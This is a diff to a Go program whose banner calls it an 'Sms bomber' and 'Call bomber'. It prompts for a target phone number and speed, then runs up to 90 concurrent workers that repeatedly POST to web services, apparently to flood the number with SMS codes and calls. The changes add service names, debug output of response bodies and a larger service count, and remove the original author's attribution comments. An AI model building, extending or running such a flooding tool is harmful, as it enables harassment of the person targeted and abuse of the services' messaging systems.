@@ -29,16 +29,17 @@ func clearScreen() {
 	cmd.Run()
 }
 
-func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
+func sendJSONRequest(client *http.Client, ctx context.Context, serviceName, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
 	const retryDelay = 2 * time.Second
+	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
 		case <-ctx.Done():
-			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
 			ch <- 0
 			return
 		default:
@@ -46,7 +47,7 @@ func sendJSONRequest(client *http.Client, ctx context.Context, url string, paylo
 
 		jsonData, err := json.Marshal(payload)
 		if err != nil {
-			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
 			if retry == maxRetries-1 {
 				ch <- http.StatusInternalServerError
 				return
@@ -57,7 +58,7 @@ func sendJSONRequest(client *http.Client, ctx context.Context, url string, paylo
 
 		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
 		if err != nil {
-			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+			fmt.Printf("\033[01;31m[-] Error while creating request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
 			if retry == maxRetries-1 {
 				ch <- http.StatusInternalServerError
 				return
@@ -67,45 +68,61 @@ func sendJSONRequest(client *http.Client, ctx context.Context, url string, paylo
 		}
 		req.Header.Set("Content-Type", "application/json")
 
-		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
 		resp, err := client.Do(req)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
-				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
 				if retry == maxRetries-1 {
-					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
 					ch <- http.StatusInternalServerError
 					return
 				}
 				time.Sleep(retryDelay)
 				continue
 			} else if ctx.Err() == context.Canceled {
-				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
 				ch <- 0
 				return
 			} else {
-				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
 				ch <- http.StatusInternalServerError
 				return
 			}
 		}
+
+		// --- بخش اضافه شده برای دیباگ ---
+		if resp.StatusCode < 400 && resp.StatusCode != 0 {
+			bodyBytes := make([]byte, bodyReadLimit)
+			n, readErr := resp.Body.Read(bodyBytes)
+			// اگر تعداد بایت خوانده شده به limit رسید و خطایی نبود، احتمالاً بدنه بزرگتر است
+			isTruncated := n == bodyReadLimit && readErr == nil
+			bodyString := string(bodyBytes[:n])
+
+			fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
+				serviceName, resp.StatusCode, n, ternary(isTruncated, "+", ""), bodyString)
+			// توجه: اینجا resp.Body خوانده شده، اگر بعداً نیاز به خواندن دوباره بود، باید Re-wrap شود که پیچیده است.
+            // چون در کد اصلی فقط Close می شود، خواندن اینجا مشکلی ایجاد نمی کند.
+		}
+		// --- پایان بخش اضافه شده ---
+
 
 		ch <- resp.StatusCode
 		resp.Body.Close()
 		return
 	}
 }
-//Code by @monsmain
-func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
+
+func sendFormRequest(client *http.Client, ctx context.Context, serviceName, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
 	const retryDelay = 3 * time.Second
+	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
 		case <-ctx.Done():
-			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
 			ch <- 0
 			return
 		default:
@@ -114,7 +131,7 @@ func sendFormRequest(client *http.Client, ctx context.Context, url string, formD
 
 		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
 		if err != nil {
-			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+			fmt.Printf("\033[01;31m[-] Error while creating form request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
 			if retry == maxRetries-1 {
 				ch <- http.StatusInternalServerError
 				return
@@ -124,35 +141,56 @@ func sendFormRequest(client *http.Client, ctx context.Context, url string, formD
 		}
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
 		resp, err := client.Do(req)
 		if err != nil {
 
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
-				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
 				if retry == maxRetries-1 {
-					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
 					ch <- http.StatusInternalServerError
 					return
 				}
 				time.Sleep(retryDelay)
 				continue
 			} else if ctx.Err() == context.Canceled {
-				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
 				ch <- 0
 				return
 			} else {
 
-				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
 				ch <- http.StatusInternalServerError
 				return
 			}
 		}
 
+		// --- بخش اضافه شده برای دیباگ ---
+		if resp.StatusCode < 400 && resp.StatusCode != 0 {
+			bodyBytes := make([]byte, bodyReadLimit)
+			n, readErr := resp.Body.Read(bodyBytes)
+            isTruncated := n == bodyReadLimit && readErr == nil
+			bodyString := string(bodyBytes[:n])
+
+			fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
+				serviceName, resp.StatusCode, n, ternary(isTruncated, "+", ""), bodyString)
+			// توجه: اینجا resp.Body خوانده شده، اگر بعداً نیاز به خواندن دوباره بود، باید Re-wrap شود که پیچیده است.
+            // چون در کد اصلی فقط Close می شود، خواندن اینجا مشکلی ایجاد نمی کند.
+		}
+		// --- پایان بخش اضافه شده ---
+
 		ch <- resp.StatusCode
 		resp.Body.Close()
 		return
 	}
+}
+
+// تابع کمکی ساده برای شبیه سازی ternary operator در Go
+func ternary(condition bool, trueVal, falseVal string) string {
+	if condition {
+		return trueVal
+	}
+	return falseVal
 }
 func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
@@ -280,8 +318,11 @@ func main() {
 `)
 	fmt.Print("\033[0m")
 
+// تعداد کل سرویس هایی که اضافه می کنیم (1 سرویس قبلی + 12 سرویس جدید)
+	numberOfServices := 1 + 12
+	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d\n", numberOfServices)
+	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // این عدد 6 ثابت باقی مانده
 
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	var phone string
 	fmt.Scan(&phone)
@@ -294,47 +335,43 @@ func main() {
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
 	fmt.Scan(&speedChoice)
 
-	var numWorkers int 
-//Code by @monsmain
-	switch strings.ToLower(speedChoice) { 
+	var numWorkers int
+	switch strings.ToLower(speedChoice) {
 	case "fast":
-
-		numWorkers = 90 
+		numWorkers = 90
 		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
 	case "medium":
-
-		numWorkers = 40 
+		numWorkers = 40
 		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
 	default:
-
-		numWorkers = 40 
+		numWorkers = 40
 		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
-	}//Code by @monsmain
-
+	}
 
 	ctx, cancel := context.WithCancel(context.Background())
 	signalChan := make(chan os.Signal, 1)
-
 	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 
 	go func() {
 		<-signalChan
 		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
-		cancel()
+		cancel() // ارسال سیگنال لغو به Context
 	}()
 
-cookieJar, _ := cookiejar.New(nil)
+	cookieJar, _ := cookiejar.New(nil)
 	client := &http.Client{
-		Jar: cookieJar,
-        Timeout: 10 * time.Second,
+		Jar:     cookieJar,
+		Timeout: 10 * time.Second, // Timeout برای هر درخواست
 	}
 
-	tasks := make(chan func(), repeatCount*40)
+	// اندازه کانال Task به تعداد کل درخواست ها (تعداد تکرار * تعداد سرویس ها)
+	totalRequests := repeatCount * numberOfServices
+	tasks := make(chan func(), totalRequests)
+	ch := make(chan int, totalRequests) // کانال نتیجه هم به همین اندازه و از نوع int باقی می ماند
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*40)
-
+	// راه اندازی Worker Pool (بدون تغییر)
 	for i := 0; i < numWorkers; i++ {
 		go func() {
 			for task := range tasks {
@@ -343,6 +380,7 @@ cookieJar, _ := cookiejar.New(nil)
 		}()
 	}
 
+	// اضافه کردن Task ها به کانال tasks
 	for i := 0; i < repeatCount; i++ {
 
 // --- سرویس 1: MCIShop (همان کد قبلی) ---
